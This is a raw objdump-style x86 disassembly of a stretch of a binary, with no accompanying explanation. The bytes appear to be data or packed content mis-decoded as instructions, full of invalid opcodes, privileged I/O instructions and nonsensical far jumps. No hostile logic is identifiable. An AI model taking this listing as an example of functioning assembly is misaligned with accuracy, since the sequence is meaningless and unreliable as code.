  41ab09:	data16 jg 0x41ab61
  41ab0c:	or     al,BYTE PTR [edi+0x494cb50d]
  41ab12:	test   al,0xeb
  41ab14:	call   0xe22b:0x18ea9288
  41ab1b:	add    bl,BYTE PTR [ecx+0x4e252720]
  41ab21:	popa   
  41ab22:	mov    esi,ds
  41ab24:	cmp    bl,BYTE PTR [ebx]
  41ab26:	push   es
  41ab27:	lock daa 
  41ab29:	sbb    BYTE PTR [edi+0x75f16372],ch
  41ab2f:	addr16 popf 
  41ab31:	retf   0x9928
  41ab34:	or     bl,BYTE PTR gs:[ebp+0x76]
  41ab38:	cmc    
  41ab39:	sub    ecx,DWORD PTR [ebx-0x47f4773a]
  41ab3f:	xor    DWORD PTR [esi],ebx
  41ab41:	xor    ch,BYTE PTR [edx]
  41ab43:	outs   dx,DWORD PTR ds:[esi]
  41ab44:	iret   
  41ab45:	loope  0x41abbe
  41ab47:	div    BYTE PTR [edx]
  41ab49:	(bad)  
  41ab4a:	cmp    bh,bh
  41ab4c:	jmp    0x20f3bb3c
  41ab51:	push   esp
  41ab52:	push   ecx
  41ab53:	repnz cmp bl,BYTE PTR [edi+0x4b9e36a3]
  41ab5a:	fild   QWORD PTR [esi+0x5856dc0]
  41ab60:	jno    0x41abd5
  41ab62:	(bad)  
  41ab64:	std    
  41ab65:	push   cs
  41ab66:	aaa    
  41ab67:	in     eax,dx
  41ab68:	sar    DWORD PTR [esi+0x10ab4d83],cl
  41ab6e:	add    bh,al
  41ab70:	push   0x1f
  41ab72:	push   ds
  41ab73:	mov    al,0x2a
  41ab75:	xchg   ebx,eax
  41ab76:	repnz (bad) 
  41ab79:	scas   al,BYTE PTR es:[edi]
  41ab7a:	and    dh,BYTE PTR [ebx]
  41ab7c:	outs   dx,DWORD PTR ds:[esi]
  41ab7d:	add    ecx,DWORD PTR [esi]
  41ab7f:	out    0x1a,al
  41ab81:	imul   ebp,esp,0x28
  41ab84:	sbb    ch,al
  41ab86:	out    dx,eax
  41ab87:	and    DWORD PTR [esi],edi
  41ab89:	test   BYTE PTR [esi+eiz*8+0x4568dfdc],bl
  41ab90:	sub    eax,0xa063703f
  41ab95:	pop    edx
  41ab96:	pop    ecx
  41ab97:	aad    0x76
  41ab99:	adc    ebp,edi
  41ab9b:	xchg   ebp,eax
  41ab9c:	xchg   esi,eax
  41ab9d:	gs xor eax,0x27c7ac20
  41aba3:	mov    esi,0x50793bdf
  41aba8:	ja     0x41abec
  41abaa:	push   ss
  41abab:	cmp    DWORD PTR [ebp-0x30],0x38c89395
  41abb2:	xchg   esp,eax
  41abb3:	shl    BYTE PTR [esi-0xae61f23],cl
  41abb9:	arpl   WORD PTR [esi-0x27],bp
  41abbc:	or     BYTE PTR [ecx-0x732d2d0d],dh
  41abc2:	cdq    
  41abc3:	jmp    0xf47b:0xc72a9751
  41abca:	js     0x41ab8c
  41abcc:	push   ebx
  41abcd:	jne    0x41abfc
  41abcf:	jnp    0x41abbf
  41abd1:	jnp    0x41abff
  41abd3:	pop    ss
  41abd4:	es sbb al,0x9f
  41abd7:	jno    0x41ab90
  41abd9:	mov    ecx,0xae2d4740
  41abde:	lea    edi,[edx]
  41abe0:	ret    
  41abe1:	adc    DWORD PTR [edi+0xb],ecx
  41abe4:	and    ebx,DWORD PTR [eax-0x7eb15536]
  41abea:	mov    DWORD PTR [ebx+0x1d26cc5b],eax
  41abf0:	jmp    0x41aba7
  41abf2:	inc    edx
  41abf3:	mov    eax,ds:0xc2e58c84
  41abf8:	and    al,0xec
  41abfa:	(bad)  
  41abfb:	rcr    DWORD PTR [eax],1
  41abfd:	add    eax,0xf27865b3
  41ac02:	push   es
  41ac03:	cmp    eax,0xd68cb0df
  41ac08:	(bad)  
  41ac09:	push   ebx
  41ac0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac0b:	sub    edi,ebp
  41ac0d:	jge    0x41ac2f
  41ac0f:	xor    cl,BYTE PTR [edx+0x6]
  41ac12:	mov    edi,0xc2a7a632
  41ac17:	pop    esp
  41ac18:	mov    al,0x5a
  41ac1a:	ret    0x2b15
  41ac1d:	dec    ebp
  41ac1e:	push   0x8934dfc9
  41ac23:	loop   0x41ac55
  41ac25:	cmc    
  41ac26:	in     al,0x4e
  41ac28:	mov    DWORD PTR [edx-0x4b149b85],esi
  41ac2e:	push   ss
  41ac2f:	rcr    BYTE PTR [eax+0x43],cl
  41ac32:	xor    dl,al
  41ac34:	and    ebx,ebx
  41ac36:	inc    edi
  41ac37:	das    
  41ac38:	mov    ecx,0x38dafaf4
  41ac3d:	push   cs
  41ac3e:	sub    DWORD PTR [ebp+0x2adc0878],0xffffffe0
  41ac45:	jno    0x41ac08
  41ac47:	and    dl,ch
  41ac49:	adc    al,0xd
  41ac4b:	nop
  41ac4c:	cld    
  41ac4d:	nop
  41ac4e:	jle    0x41ac35
  41ac50:	inc    esp
  41ac51:	mov    ebx,0xe71d46df
  41ac56:	data16 fadd QWORD PTR [edi-0x69]
  41ac5a:	sbb    DWORD PTR cs:[ecx-0x5ea1dc80],ebx
  41ac61:	cmp    edx,ebp
  41ac63:	scas   al,BYTE PTR es:[edi]
  41ac64:	addr16 jne 0x41ac24
  41ac67:	daa    
  41ac68:	fisttp WORD PTR [edx]
  41ac6a:	pop    edi
  41ac6b:	sbb    eax,0x6bfe2fc7
  41ac70:	push   eax
  41ac71:	push   ds
  41ac72:	xchg   edx,eax
  41ac73:	mov    WORD PTR [eax],ds
  41ac75:	cmp    bl,ah
  41ac77:	push   eax
  41ac78:	dec    esp
  41ac79:	aas    
  41ac7a:	push   ecx
  41ac7b:	dec    ebp
  41ac7c:	sbb    DWORD PTR [edi-0x4c3c39da],ebx
  41ac82:	cld    
  41ac83:	xlat   BYTE PTR ds:[ebx]
  41ac84:	or     dl,al
  41ac86:	xchg   ch,ah
  41ac88:	into   
  41ac89:	mov    eax,ds:0x1180c660
  41ac8e:	lods   eax,DWORD PTR ds:[esi]
  41ac8f:	cmp    esi,eax
  41ac91:	out    0xab,al
  41ac93:	mov    esp,0x81b1bcdb
  41ac98:	daa    
  41ac99:	pop    ebp
  41ac9a:	xchg   DWORD PTR [eax+0x737d8f0e],ebx
  41aca0:	inc    ebx
  41aca1:	aas    
  41aca2:	sub    edi,edi
  41aca4:	repnz sub al,0xe8
  41aca7:	retf   0x9dc1
  41acaa:	ret    
  41acab:	sub    bl,BYTE PTR [eax+0x434e46f9]
  41acb1:	int3   
  41acb2:	pop    esp
  41acb3:	xor    dh,BYTE PTR [edx+0xbb3ac27]
  41acb9:	jl     0x41ad13
  41acbb:	je     0x41accb
  41acbd:	rcr    BYTE PTR [edx+ebp*8-0x2409bd0d],0x41
  41acc5:	(bad)  
  41acc6:	gs pop esp
  41acc8:	lods   al,BYTE PTR ds:[esi]
  41acc9:	xor    esi,DWORD PTR [edi]
  41accb:	aam    0xfe
  41accd:	mov    ebx,DWORD PTR [ecx+0x64]
  41acd0:	dec    edi
  41acd1:	mov    esi,0xd8b06252
  41acd6:	dec    ebx
  41acd7:	fldcw  WORD PTR [ecx+ebx*1-0x75]
  41acdb:	popa   
  41acdc:	and    ecx,edx
  41acde:	mov    edi,0x8ae7e6f0
  41ace3:	xor    bh,bl
  41ace5:	mov    edx,0x351af069
  41acea:	ret    0xb56
  41aced:	and    eax,0x60106856
  41acf2:	pop    ds
  41acf3:	or     BYTE PTR [esi+0x1a],ah
  41acf6:	pop    edi
  41acf7:	out    0xc1,eax
  41acf9:	in     al,dx
  41acfa:	xchg   DWORD PTR [eax+0x2f],ebp
  41acfd:	daa    
  41acfe:	sbb    BYTE PTR [edx+edi*2+0x3],bl
  41ad02:	mov    edi,0xeb1b1c11
  41ad07:	or     DWORD PTR [eax+0x74558051],esp
  41ad0d:	adc    ah,BYTE PTR [eax+0x43ceb235]
  41ad13:	arpl   WORD PTR [ebx],di
  41ad15:	loopne 0x41acc1
  41ad17:	jle    0x41ad46
  41ad19:	sahf   
  41ad1a:	shl    ah,0xc
  41ad1d:	xchg   esi,eax
  41ad1e:	and    dh,BYTE PTR [edi]
  41ad20:	repz or dh,dl
  41ad23:	jg     0x41ad68
  41ad25:	sar    ch,0x8f
  41ad28:	adc    eax,0xb77ed011
  41ad2d:	jmp    0x41ad4b
  41ad2f:	cdq    
  41ad30:	xchg   DWORD PTR [ebx],ecx
  41ad32:	out    0x18,al
  41ad34:	out    dx,eax
  41ad35:	dec    ebp
  41ad36:	fst    DWORD PTR [edi-0xf36dbe]
  41ad3c:	or     eax,0xe9a7cc6e
  41ad41:	loopne 0x41aced
  41ad43:	out    0xfa,al
  41ad45:	in     al,0x49
  41ad47:	cmp    bl,BYTE PTR [edi+0x4d63be24]
  41ad4d:	pop    DWORD PTR [ecx]
  41ad4f:	arpl   WORD PTR [ebx+0x212d60cb],sp
  41ad55:	(bad)  
  41ad56:	cwde   
  41ad57:	xor    cl,BYTE PTR [edi+esi*4+0x42]
  41ad5b:	(bad)  
  41ad5c:	xchg   edi,eax
  41ad5d:	sbb    al,0x4c
  41ad5f:	je     0x41ad91
  41ad61:	sub    bl,0xa5
  41ad64:	iret   
  41ad65:	and    esp,DWORD PTR [esi]
  41ad67:	iret   
  41ad68:	dec    eax
  41ad69:	mov    ch,0x48
  41ad6b:	jl     0x41ad5a
  41ad6d:	fs dec esi
  41ad6f:	jmp    FWORD PTR [ecx+0xa]
  41ad72:	jbe    0x41adf2
  41ad74:	cmp    esp,ebp
  41ad76:	jg     0x41ad41
  41ad78:	fscale 
  41ad7a:	fs test al,0x7a
  41ad7d:	sub    eax,DWORD PTR [eax]
  41ad7f:	push   edi
  41ad80:	mov    ebx,0x5a9aaf8
  41ad85:	pop    ebp
  41ad86:	xchg   edx,eax
  41ad87:	inc    ebx
  41ad88:	inc    esp
  41ad89:	(bad)  
  41ad8a:	pop    esi
  41ad8b:	mov    BYTE PTR [ebx-0x2b6024aa],dh
  41ad91:	pushf  
  41ad92:	sbb    BYTE PTR [edx],dh
  41ad94:	ins    BYTE PTR es:[edi],dx
  41ad95:	sti    
  41ad96:	xchg   ebp,eax
  41ad97:	push   ebp
  41ad98:	push   ss
  41ad99:	add    ebx,DWORD PTR [edi]
  41ad9b:	int    0xb9
  41ad9d:	xor    DWORD PTR [ebx],0xf868380e
  41ada3:	imul   ecx,DWORD PTR [ebp-0x1d],0x9a227c80
  41adaa:	mov    cl,0x6e
  41adac:	aaa    
  41adad:	test   al,0xc8
  41adaf:	pop    eax
  41adb0:	add    dh,BYTE PTR [ebx+0x5e]
  41adb3:	sub    BYTE PTR [ebp-0x1f],0x59
  41adb7:	fadd   QWORD PTR [edx-0x9]
  41adba:	pop    edx
  41adbb:	jmp    0x70ff07e6
  41adc0:	dec    ebp
  41adc1:	or     BYTE PTR [ebx-0x2e],dh
  41adc4:	dec    edx
  41adc5:	loope  0x41ae26
  41adc7:	adc    al,0x6e
  41adc9:	sub    ebx,DWORD PTR [ebp-0x462cafae]
  41adcf:	xadd   DWORD PTR [esi-0x2b],edi
  41add3:	out    0xec,eax
  41add5:	cmp    ah,bl
  41add7:	jmp    0x149d11e4
  41addc:	mov    DWORD PTR [edx+eiz*1-0x40],edx
  41ade0:	mov    ah,0x68
  41ade2:	xchg   ecx,eax
  41ade3:	sti    
  41ade4:	(bad)  
  41ade5:	popf   
  41ade6:	mov    esp,0x255b649b
  41adeb:	mov    bl,0x3c
  41aded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adee:	sbb    cl,BYTE PTR [edx]
  41adf0:	add    bh,ah
  41adf2:	push   ecx
  41adf3:	jae    0x41ad8d
  41adf5:	mov    dl,0x14
  41adf7:	into   
  41adf8:	mov    esi,0xcff15585
  41adfd:	mov    eax,0x9e7d3bf1
  41ae02:	jmp    0x20de:0x25357334
  41ae09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae0a:	xor    DWORD PTR ds:0x777a1b90,esp
  41ae10:	dec    ecx
  41ae11:	mov    esi,edi
  41ae13:	pop    esp
  41ae14:	dec    esp
  41ae15:	sahf   
  41ae16:	jne    0x41ae89
  41ae18:	aaa    
  41ae19:	fild   WORD PTR [edx]
  41ae1b:	push   ebx
  41ae1c:	mov    ah,0x4c
  41ae1e:	mov    cl,0xe8
  41ae20:	(bad)  
  41ae21:	jae    0x41ae9a
  41ae23:	dec    ebx
  41ae24:	ins    DWORD PTR es:[edi],dx
  41ae25:	mov    ch,0xe
  41ae27:	mov    ds:0x3bc27e37,eax
  41ae2c:	xor    al,0xa2
  41ae2e:	sbb    eax,0x7796504e
  41ae33:	fld    DWORD PTR [esi+0x63]
  41ae36:	xor    BYTE PTR [edx+0x5e3a54bd],al
  41ae3c:	inc    edx
  41ae3d:	out    0xd4,al
  41ae3f:	es dec ebx
  41ae41:	test   BYTE PTR [esi+0x5ae0b1c0],ch
  41ae47:	mov    cl,0x52
  41ae49:	mov    ebx,0x934a7338
  41ae4e:	mov    ecx,0x923fc478
  41ae53:	out    0x20,al
  41ae55:	ins    BYTE PTR es:[edi],dx
  41ae56:	pusha  
  41ae57:	xor    BYTE PTR [ecx-0x457a51ff],cl
  41ae5d:	stos   DWORD PTR es:[edi],eax
  41ae5e:	mov    bl,0x46
  41ae60:	add    al,0x17
  41ae62:	ins    BYTE PTR es:[edi],dx
  41ae63:	jnp    0x41ae03
  41ae65:	in     eax,dx
  41ae66:	leave  
  41ae67:	repz sbb DWORD PTR [edx+0x66],edx
  41ae6b:	popf   
  41ae6c:	rol    BYTE PTR [eax+ecx*8-0x6fba9180],cl
  41ae73:	xchg   esi,eax
  41ae74:	jb     0x41ae96
  41ae76:	stos   DWORD PTR es:[edi],eax
  41ae77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae78:	ficomp WORD PTR [edx]
  41ae7a:	(bad)  [esi-0x35]
  41ae7d:	sar    DWORD PTR [ebx-0x2f2d00fd],cl
  41ae83:	pop    esi
  41ae84:	das    
  41ae85:	mov    esp,0x5df29f66
  41ae8a:	mov    ebx,0x5ac76671
  41ae8f:	les    ebx,FWORD PTR [esp+ebp*4-0x13be25d3]
  41ae96:	aam    0x1d
  41ae98:	out    dx,eax
  41ae99:	gs test eax,0x4abd1910
  41ae9f:	and    ebx,esp
  41aea1:	sub    ebp,ebx
  41aea3:	adc    DWORD PTR [eax],0xa97f8ee7
  41aea9:	pop    es
  41aeaa:	hlt    
  41aeab:	mov    ?,edi
  41aead:	loope  0x41aeeb
  41aeaf:	and    eax,0xcb64d765
  41aeb4:	mov    ch,al
  41aeb6:	fcomp  QWORD PTR [esi+0x55]
  41aeb9:	sahf   
  41aeba:	je     0x41af01
  41aebc:	fistp  DWORD PTR [eax+0x2abcb5ae]
  41aec2:	ss js  0x41ae95
  41aec5:	hlt    
  41aec6:	mov    DWORD PTR [edi+0x79],0x98a3359c
  41aecd:	les    esp,FWORD PTR [edx-0x17]
  41aed0:	cmp    dh,ah
  41aed2:	stos   BYTE PTR es:[edi],al
  41aed3:	cmc    
  41aed4:	pushf  
  41aed5:	pushf  
  41aed6:	sub    edi,esi
  41aed8:	addr16 cmp edi,edi
  41aedb:	mov    ebx,0xb470be69
  41aee0:	retf   0x6f22
  41aee3:	loopne 0x41ae79
  41aee5:	popa   
  41aee6:	dec    ebx
  41aee7:	mov    ds:0x68d5b540,al
  41aeec:	ds sub eax,0xd6494e9
  41aef2:	mov    eax,ds:0x5d7e4a95
  41aef7:	dec    si
  41aef9:	cmc    
  41aefa:	push   edx
  41aefb:	sar    BYTE PTR [edi-0x5622b1da],cl
  41af01:	pop    edi
  41af02:	scas   eax,DWORD PTR es:[edi]
  41af03:	jne    0x41aea3
  41af05:	cmp    BYTE PTR [ecx*4+0x6e12a6c9],ah
  41af0c:	jl     0x41ae8f
  41af0e:	or     ch,BYTE PTR [esi+eiz*1-0x5f38bae2]
  41af15:	test   eax,0x62c05678
  41af1a:	jo     0x41af95
  41af1c:	(bad)  
  41af1d:	jae    0x41aebb
  41af1f:	hlt    
  41af20:	adc    al,0x95
  41af22:	clc    
  41af23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af24:	test   DWORD PTR [esi],edx
  41af26:	les    ebp,FWORD PTR [edx]
  41af28:	dec    ebp
  41af29:	or     cl,BYTE PTR [edi]
  41af2b:	dec    ebp
  41af2c:	in     al,dx
  41af2d:	cmp    DWORD PTR [esi-0x17],0xffffff83
  41af31:	lahf   
  41af32:	popa   
  41af33:	call   0x9f9f8206
  41af38:	stc    
  41af39:	loopne 0x41aecf
  41af3b:	fdivr  QWORD PTR [ebx-0x3448c014]
  41af41:	stos   BYTE PTR es:[edi],al
  41af42:	pop    ecx
  41af43:	inc    eax
  41af44:	repnz push ss
  41af46:	dec    edi
  41af47:	repnz enter 0x3bd4,0x43
  41af4c:	cmp    al,0x90
  41af4e:	adc    ecx,DWORD PTR [esi+0x27]
  41af51:	es xor eax,0x94dcf518
  41af57:	mov    cl,0xf2
  41af59:	push   ss
  41af5a:	pop    esi
  41af5b:	mov    ebx,0x8d3ae068
  41af60:	test   eax,0x9f63bff
  41af65:	bound  ebp,QWORD PTR [ecx-0x5704aca0]
  41af6b:	sub    eax,0xcec45a3c
  41af70:	hlt    
  41af71:	enter  0x865d,0xbc
  41af75:	fwait
  41af76:	(bad)  
  41af77:	scas   al,BYTE PTR es:[edi]
  41af78:	xor    eax,0xeb3b2e96
  41af7d:	jmp    0x41af23
  41af7f:	lds    ecx,FWORD PTR [esi]
  41af81:	stc    
  41af82:	pop    ecx
  41af83:	in     eax,0xce
  41af85:	enter  0xf98f,0x88
  41af89:	xchg   ebx,eax
  41af8a:	dec    BYTE PTR [ebx+edi*8]
  41af8d:	imul   ebx,DWORD PTR [ebx+ebx*4],0x4a
  41af91:	mov    bl,0xb6
  41af93:	sub    DWORD PTR [edi],esp
  41af95:	push   ecx
  41af96:	pop    ecx
  41af97:	mov    al,ds:0xb53759bb
  41af9c:	in     eax,0x95
  41af9e:	jmp    0x7477:0xa199721a
  41afa5:	sbb    BYTE PTR [edi],al
  41afa7:	fdivr  QWORD PTR [edi]
  41afa9:	sub    DWORD PTR [ebx],esi
  41afab:	pop    ebx
  41afac:	mov    ch,0x15
  41afae:	and    edi,DWORD PTR ds:[esi]
  41afb1:	mov    cl,0x6f
  41afb3:	stc    
  41afb4:	jbe    0x41afda
  41afb6:	pop    eax
  41afb7:	pop    eax
  41afb8:	cmp    DWORD PTR [ebx-0x38900b7e],ebp
  41afbe:	rcr    dl,cl
  41afc0:	push   0x2eaf3136
  41afc5:	mov    al,BYTE PTR [ecx+0x9]
  41afc8:	sub    eax,DWORD PTR [eax]
  41afca:	fldenv [esi+0x74]
  41afcd:	in     eax,0x68
  41afcf:	call   FWORD PTR [ecx-0x5cdfd708]
  41afd5:	and    al,0x70
  41afd7:	cli    
  41afd8:	sub    eax,0xe7081966
  41afdd:	or     eax,DWORD PTR [eax+0x4c53757c]
  41afe3:	mov    ds:0x6038f7bd,eax
  41afe8:	mov    eax,0x6ef7f9ee
  41afed:	fistp  DWORD PTR ds:0xe764906c
  41aff3:	data16 (bad) 
  41aff5:	(bad)  
  41aff6:	cmp    esp,DWORD PTR [ecx-0x40]
  41aff9:	inc    edi
  41affa:	sbb    al,0x1d
  41affc:	sub    eax,0x372c6285
  41b001:	xor    eax,0x9f470f7
  41b006:	inc    ecx
  41b007:	stc    
  41b008:	pop    ebp
  41b009:	add    eax,0x5b241978
  41b00e:	pop    edi
  41b00f:	rcr    DWORD PTR [eax+edx*2],0x8a
  41b013:	mov    ecx,0x3895d685
  41b018:	sbb    eax,esp
  41b01a:	pop    edi
  41b01b:	outs   dx,BYTE PTR ds:[esi]
  41b01c:	push   ecx
  41b01d:	hlt    
  41b01e:	and    esi,edi
  41b020:	ja     0x41b037
  41b022:	aas    
  41b023:	aaa    
  41b024:	push   ecx
  41b025:	xchg   ebx,eax
  41b026:	outs   dx,DWORD PTR ds:[esi]
  41b027:	pop    es
  41b028:	xor    edi,esi
  41b02a:	(bad)  
  41b02b:	pop    edx
  41b02c:	(bad)  
  41b02e:	dec    esp
  41b02f:	scas   eax,DWORD PTR es:[edi]
  41b030:	adc    DWORD PTR [esi-0x33],0xffffffa9
  41b034:	pusha  
  41b035:	pusha  
  41b036:	jecxz  0x41affb
  41b038:	xchg   bh,bh
  41b03a:	scas   al,BYTE PTR es:[edi]
  41b03b:	adc    esp,DWORD PTR [ebp+edx*1-0x38]
  41b03f:	es pop edi
  41b041:	mov    esp,0xd1fc156c
  41b046:	pushf  
  41b047:	into   
  41b048:	xor    esp,DWORD PTR [edi+0x26186a0d]
  41b04e:	iret   
  41b04f:	xor    eax,0xf2667d31
  41b054:	add    DWORD PTR [ebx+0x1cf164ee],edi
  41b05a:	mov    dh,0xc2
  41b05c:	ins    BYTE PTR es:[edi],dx
  41b05d:	jle    0x41b025
  41b05f:	sti    
  41b060:	mov    DWORD PTR [esp+edi*2+0x13f5fb9b],ebx
  41b067:	test   BYTE PTR [ecx+0x60],al
  41b06a:	or     DWORD PTR [ecx-0x45a58bd1],ebx
  41b070:	clc    
  41b071:	jl     0x41b014
  41b073:	xlat   BYTE PTR ds:[ebx]
  41b074:	aad    0xb7
  41b076:	hlt    
  41b077:	stc    
  41b078:	leave  
  41b079:	sub    DWORD PTR [ecx],0xffffffe7
  41b07c:	xor    bl,BYTE PTR [esi]
  41b07e:	pop    edi
  41b07f:	jg     0x41b0cc
  41b081:	push   es
  41b082:	xor    al,0x68
  41b084:	adc    bh,BYTE PTR [esi]
  41b086:	sub    ebx,ebp
  41b088:	pop    esi
  41b089:	int3   
  41b08a:	icebp  
  41b08b:	xchg   edi,eax
  41b08c:	add    DWORD PTR [eax+esi*8-0x41],edx
  41b090:	adc    BYTE PTR [ecx+0x5d6beb16],dl
  41b096:	add    al,0x2a
  41b098:	stos   DWORD PTR es:[edi],eax
  41b099:	iret   
  41b09a:	imul   edx,DWORD PTR [edi+0x12],0xffffffcd
  41b09e:	mov    cl,0xae
  41b0a0:	pop    edx
  41b0a1:	arpl   WORD PTR [ebp-0x3e153745],cx
  41b0a7:	sahf   
  41b0a8:	mov    esi,0x2fd6908d
  41b0ad:	inc    ebx
  41b0ae:	dec    ebx
  41b0af:	neg    ah
  41b0b1:	rcr    DWORD PTR [esi],cl
  41b0b3:	mov    bl,0x5c
  41b0b5:	stos   BYTE PTR es:[edi],al
  41b0b6:	repnz imul ecx,DWORD PTR [ebx],0xffffff82
  41b0ba:	inc    eax
  41b0bb:	dec    edi
  41b0bc:	jae    0x41b04f
  41b0be:	add    eax,0x806ad6b
  41b0c3:	adc    DWORD PTR [edi+ecx*4],ecx
  41b0c6:	add    bl,BYTE PTR [eax-0x1b2f4b6a]
  41b0cc:	lock jno 0x41b106
  41b0cf:	out    0xef,al
  41b0d1:	dec    BYTE PTR [ecx+0x69]
  41b0d4:	dec    esp
  41b0d5:	dec    ecx
  41b0d6:	int    0x59
  41b0d8:	pop    esi
  41b0d9:	cmp    bh,bl
  41b0db:	pusha  
  41b0dc:	push   es
  41b0dd:	push   0xffffffaf
  41b0df:	scas   al,BYTE PTR es:[edi]
  41b0e0:	out    0xd6,eax
  41b0e2:	out    0xab,al
  41b0e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0e5:	popa   
  41b0e6:	sbb    BYTE PTR [eax+0x1d85d465],ah
  41b0ec:	inc    edi
  41b0ed:	ret    
  41b0ee:	inc    esp
  41b0ef:	ins    BYTE PTR es:[edi],dx
  41b0f0:	les    ebx,FWORD PTR [edi]
  41b0f2:	cmp    bl,0x17
  41b0f5:	dec    ebx
  41b0f6:	mov    ebp,edx
  41b0f8:	mov    al,0x2f
  41b0fa:	icebp  
  41b0fb:	retf   0xcd6
  41b0fe:	push   edi
  41b0ff:	sbb    al,0x62
  41b101:	inc    esi
  41b102:	pop    esi
  41b103:	adc    DWORD PTR ss:[eax+0x74],edi
  41b107:	mov    cl,0xa0
  41b109:	enter  0xfbb0,0x14
  41b10d:	adc    al,0xd5
  41b10f:	mov    ch,0x76
  41b111:	popf   
  41b112:	push   0x16933a07
  41b117:	fwait
  41b118:	jmp    0x45e2f286
  41b11d:	jp     0x41b0e9
  41b11f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b120:	stc    
  41b121:	(bad)  
  41b123:	dec    ecx
  41b124:	int    0xfe
  41b126:	dec    esp
  41b127:	mov    dh,0xf1
  41b129:	iret   
  41b12a:	adc    ecx,ebp
  41b12c:	(bad)  
  41b12d:	imul   edi,DWORD PTR [edx-0x79],0x1d
  41b131:	popf   
  41b132:	pop    ebx
  41b133:	das    
  41b134:	out    dx,al
  41b135:	fstp   DWORD PTR [edx+0xd]
  41b138:	mov    bl,0x30
  41b13a:	cmc    
  41b13b:	fidiv  WORD PTR [ebp-0xf]
  41b13e:	adc    cl,BYTE PTR [edx-0x2e]
  41b141:	jbe    0x41b0cf
  41b143:	mov    ebp,0xbb7487ad
  41b148:	mov    bh,0xd1
  41b14a:	in     eax,dx
  41b14b:	inc    eax
  41b14c:	loope  0x41b0e4
  41b14e:	push   esp
  41b14f:	fcmovb st,st(6)
  41b151:	ins    DWORD PTR es:[edi],dx
  41b152:	pop    esi
  41b153:	fcmovu st,st(7)
  41b155:	not    BYTE PTR [ebp+0x6d]
  41b158:	jmp    ecx
  41b15a:	mul    DWORD PTR [esp+esi*2]
  41b15d:	imul   BYTE PTR [edi-0x6b3716a]
  41b163:	mov    eax,0x83701015
  41b168:	leave  
  41b169:	push   esi
  41b16a:	(bad)  
  41b16c:	sbb    bl,BYTE PTR [ebp-0x69cd8d4c]
  41b172:	mov    ecx,0x78bf201e
  41b177:	and    ah,bl
  41b179:	push   ebx
  41b17a:	push   edi
  41b17b:	(bad)
  41b180:	sbb    eax,eax
  41b182:	adc    al,0x89
  41b184:	test   eax,0x8b2b4bd
  41b189:	outs   dx,BYTE PTR ds:[esi]
  41b18a:	and    bh,BYTE PTR ds:0x172d1eb3
  41b190:	sub    eax,ebp
  41b192:	xlat   BYTE PTR ds:[ebx]
  41b193:	(bad)  
  41b194:	test   ch,0xdf
  41b197:	jne    0x41b13b
  41b199:	mov    cl,0xe7
  41b19b:	shl    BYTE PTR [esi+0x1bf87306],1
  41b1a1:	xchg   esp,edi
  41b1a3:	inc    esi
  41b1a4:	aas    
  41b1a5:	push   cs
  41b1a6:	mov    eax,ds:0xffc3449c
  41b1ab:	je     0x41b192
  41b1ad:	mov    ds,WORD PTR [ebx-0x6]
  41b1b0:	mov    esp,0xbea89810
  41b1b5:	in     eax,0xd7
  41b1b7:	adc    DWORD PTR [edx+0x12],0xae80e93a
  41b1be:	or     eax,0x8850bec5
  41b1c3:	mov    edx,0x55d9e1ac
  41b1c8:	pop    esi
  41b1c9:	(bad)  
  41b1ca:	pop    ecx
  41b1cb:	xchg   esi,eax
  41b1cc:	cmp    dh,BYTE PTR [ecx]
  41b1ce:	(bad)  
  41b1cf:	and    al,0x64
  41b1d1:	mov    cl,0x67
  41b1d3:	jle    0x41b192
  41b1d5:	fild   DWORD PTR ds:0x3bcf119e
  41b1db:	dec    ecx
  41b1dc:	xchg   BYTE PTR [ebx-0x29],al
  41b1df:	call   0xf780:0xa0e96089
  41b1e6:	xchg   BYTE PTR [esi+ebx*2-0x6bef855],dl
  41b1ed:	and    edx,DWORD PTR [ebx-0x4]
  41b1f0:	mov    fs,WORD PTR [edi]
  41b1f2:	mov    cl,0x53
  41b1f4:	scas   eax,DWORD PTR es:[edi]
  41b1f5:	inc    ebx
  41b1f6:	ins    BYTE PTR es:[edi],dx
  41b1f7:	xchg   ebx,eax
  41b1f8:	mov    cl,0xa4
  41b1fa:	mov    cs,WORD PTR [ebx+0x6aa3b1fb]
  41b200:	xchg   ecx,eax
  41b201:	jns    0x41b276
  41b203:	(bad)  
  41b204:	iret   
  41b205:	fiadd  WORD PTR ds:0x253e31e9
  41b20b:	or     al,0xce
  41b20d:	cmp    esi,DWORD PTR [edi-0x1dcbf59f]
  41b213:	xchg   DWORD PTR [ebp+0x769dec9e],eax
  41b219:	loopne 0x41b209
  41b21b:	pop    ds
  41b21c:	addr16 (bad) 
  41b21e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b21f:	or     al,0xd
  41b221:	mov    dl,0x30
  41b223:	lock add esi,ebx
  41b226:	fistp  WORD PTR [ecx+0x52910889]
  41b22c:	inc    esi
  41b22d:	xchg   ecx,eax
  41b22e:	jb     0x41b24d
  41b230:	pop    eax
  41b231:	es push es
  41b233:	outs   dx,DWORD PTR ds:[esi]
  41b234:	hlt    
  41b235:	fadd   st,st(2)
  41b237:	jmp    0x15082268
  41b23c:	out    dx,eax
  41b23d:	lea    edi,[ecx-0x24715d10]
  41b243:	sub    ch,BYTE PTR [eax]
  41b245:	shl    DWORD PTR [esi+0x1b],0xec
  41b249:	loopne 0x41b245
  41b24b:	adc    edi,DWORD PTR [ebp+0x1c]
  41b24e:	mov    esi,esp
  41b250:	mov    ah,0x87
  41b252:	pop    ss
  41b253:	jecxz  0x41b228
  41b255:	shr    DWORD PTR [esi],cl
  41b257:	mov    ebx,0x10e7a13
  41b25c:	pop    gs
  41b25e:	pop    es
  41b25f:	loop   0x41b241
  41b261:	mov    eax,0xe5847066
  41b266:	add    DWORD PTR [edx],ecx
  41b268:	add    al,0xd8
  41b26a:	sub    eax,0x12756f7a
  41b26f:	add    al,BYTE PTR [ebp+0x216cef43]
  41b275:	out    0x42,eax
  41b277:	pop    ds
  41b278:	cmp    bh,ah
  41b27a:	or     ah,BYTE PTR [eax-0x500d7fe1]
  41b280:	sbb    bh,BYTE PTR [ebx+0x37c36cd3]
  41b286:	and    al,0xee
